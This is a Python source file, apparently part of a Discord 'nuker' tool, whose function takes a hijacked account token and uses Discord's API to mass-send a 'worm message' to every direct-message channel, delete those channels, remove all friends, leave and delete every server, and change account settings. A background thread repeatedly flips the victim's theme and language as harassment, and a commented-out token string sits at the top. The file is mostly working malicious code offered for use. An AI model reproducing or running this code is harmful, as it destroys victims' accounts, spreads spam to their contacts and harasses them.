import threading
import requests
import random

from itertools import cycle

from commoms import getheaders, proxy

# token = 'OTQwNzg0ODI0NjQ4NjMwMjk0.YgMdzg.KR98U7RVQQenO5D2bCbJRx99O40'




def Cookies_Nuke(token, worm_message):
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            proxies={"ftp": f'{proxy()}'},
            headers=headers,
            data={"content": f"{worm_message}"})
        except Exception as e:
            whylol = '12'

    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
            proxies={"ftp": f'{proxy()}'},
            headers=getheaders(token))
        except Exception as e:
            whylol = '12'

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"ftp": f'{proxy()}'}, headers=getheaders(token))
        except Exception as e:
            whylol = '12'
    
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
        except Exception as e:
            whylol = '12'

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"ftp": f'{proxy()}'}, headers={'Authorization': token})
        except Exception as e:
            whylol = '12'
    

    t.do_run = False
    requests.delete("https://discord.com/api/v8/hypesquad/online", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token))
    setting = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']

def CustomSeizure(token):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        #cycle between light/dark mode and languages
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=setting)
